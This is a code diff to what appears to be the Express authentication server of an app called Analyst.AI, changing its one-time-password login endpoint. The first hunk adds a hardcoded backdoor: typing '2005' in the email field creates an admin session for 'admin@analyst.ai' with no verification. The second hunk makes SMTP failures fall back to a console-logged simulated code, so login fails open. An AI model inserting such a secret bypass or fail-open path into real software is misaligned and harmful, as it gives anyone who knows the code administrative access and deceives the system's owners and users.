@@ -160,6 +160,29 @@ app.post('/api/auth/request-otp', async (req, res) => {
     return res.status(400).json({ success: false, error: 'Email address is required.' });
   }
 
+  // Master Access Secret Bypass
+  if (email.trim() === '2005') {
+    try {
+      const masterEmail = 'admin@analyst.ai';
+      await getOrCreateUser(masterEmail);
+      const token = 'token_master_' + Math.random().toString(36).substring(2) + Date.now().toString(36);
+      const expiresAt = new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString();
+      await createSession(token, masterEmail, expiresAt);
+      
+      console.log(`[Master Bypass] Logged in using secret code 2005 for masterEmail: ${masterEmail}`);
+      return res.json({
+        success: true,
+        bypass: true,
+        token,
+        email: masterEmail,
+        message: 'Master access granted.'
+      });
+    } catch (err) {
+      console.error('Failed to create master session:', err);
+      return res.status(500).json({ success: false, error: 'Failed to establish master session.' });
+    }
+  }
+
   // Simple email format check
   const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
   if (!emailRegex.test(email)) {
@@ -206,44 +229,47 @@ app.post('/api/auth/request-otp', async (req, res) => {
 
     if (smtpUser && smtpPass) {
       console.log(`[SMTP Mailer] Initiating real email transmission to ${email}...`);
-      
-      const transporter = nodemailer.createTransport({
-        service: 'gmail', // uses gmail as default, or configure custom hosts
-        auth: {
-          user: smtpUser,
-          pass: smtpPass
-        }
-      });
+      try {
+        const transporter = nodemailer.createTransport({
+          service: 'gmail', // uses gmail as default, or configure custom hosts
+          auth: {
+            user: smtpUser,
+            pass: smtpPass
+          }
+        });
 
-      const mailOptions = {
-        from: `"Analyst.AI Security" <${smtpUser}>`,
-        to: email,
-        subject: `Your Analyst.AI Security Verification Code: ${otpCode}`,
-        html: `
-          <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; max-width: 500px; margin: 0 auto; padding: 32px 24px; border: 1px solid #e2e8f0; border-radius: 12px; background-color: #ffffff; color: #0f172a;">
-            <div style="margin-bottom: 24px; display: flex; align-items: center; gap: 8px;">
-              <span style="font-weight: 800; font-size: 1.1rem; letter-spacing: -0.02em;">ANALYST.AI</span>
+        const mailOptions = {
+          from: `"Analyst.AI Security" <${smtpUser}>`,
+          to: email,
+          subject: `Your Analyst.AI Security Verification Code: ${otpCode}`,
+          html: `
+            <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; max-width: 500px; margin: 0 auto; padding: 32px 24px; border: 1px solid #e2e8f0; border-radius: 12px; background-color: #ffffff; color: #0f172a;">
+              <div style="margin-bottom: 24px; display: flex; align-items: center; gap: 8px;">
+                <span style="font-weight: 800; font-size: 1.1rem; letter-spacing: -0.02em;">ANALYST.AI</span>
+              </div>
+              <h2 style="font-size: 1.4rem; font-weight: 700; color: #0f172a; margin-top: 0; margin-bottom: 8px;">Verification Security Code</h2>
+              <p style="font-size: 0.9rem; color: #475569; line-height: 1.5; margin-top: 0; margin-bottom: 24px;">Please use the following 6-digit One-Time Password (OTP) to securely complete your sign-in handshake. This code is active for <strong>5 minutes</strong>.</p>
+              <div style="background-color: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; padding: 16px; text-align: center; font-size: 2rem; font-weight: 800; letter-spacing: 0.25em; color: #4f46e5; margin-bottom: 24px; font-family: monospace;">
+                ${otpCode}
+              </div>
+              <p style="font-size: 0.75rem; color: #94a3b8; line-height: 1.4; margin: 0;">If you did not request this administrative authentication handshake, you can safely ignore this email. Your SQLite databases remain securely sandboxed.</p>
             </div>
-            <h2 style="font-size: 1.4rem; font-weight: 700; color: #0f172a; margin-top: 0; margin-bottom: 8px;">Verification Security Code</h2>
-            <p style="font-size: 0.9rem; color: #475569; line-height: 1.5; margin-top: 0; margin-bottom: 24px;">Please use the following 6-digit One-Time Password (OTP) to securely complete your sign-in handshake. This code is active for <strong>5 minutes</strong>.</p>
-            <div style="background-color: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; padding: 16px; text-align: center; font-size: 2rem; font-weight: 800; letter-spacing: 0.25em; color: #4f46e5; margin-bottom: 24px; font-family: monospace;">
-              ${otpCode}
-            </div>
-            <p style="font-size: 0.75rem; color: #94a3b8; line-height: 1.4; margin: 0;">If you did not request this administrative authentication handshake, you can safely ignore this email. Your SQLite databases remain securely sandboxed.</p>
-          </div>
-        `
-      };
+          `
+        };
 
-      await transporter.sendMail(mailOptions);
-      console.log(`[SMTP Mailer] Real verification code successfully sent to: ${email}`);
+        await transporter.sendMail(mailOptions);
+        console.log(`[SMTP Mailer] Real verification code successfully sent to: ${email}`);
 
-      return res.json({
-        success: true,
-        message: 'A real security verification code has been dispatched to your email inbox.'
-      });
+        return res.json({
+          success: true,
+          message: 'A real security verification code has been dispatched to your email inbox.'
+        });
+      } catch (smtpErr) {
+        console.error('[SMTP Mailer] SMTP transport failed, falling back to simulated OTP:', smtpErr);
+      }
     }
     
-    // Developer Fallback (No SMTP keys set)
+    // Developer Fallback (No SMTP keys set or SMTP failed)
     console.log(`\n✉️  [EMAIL SMTP SIMULATION]`);
     console.log(`To: ${email}`);
     console.log(`Subject: Analyst.AI Security Verification Code`);
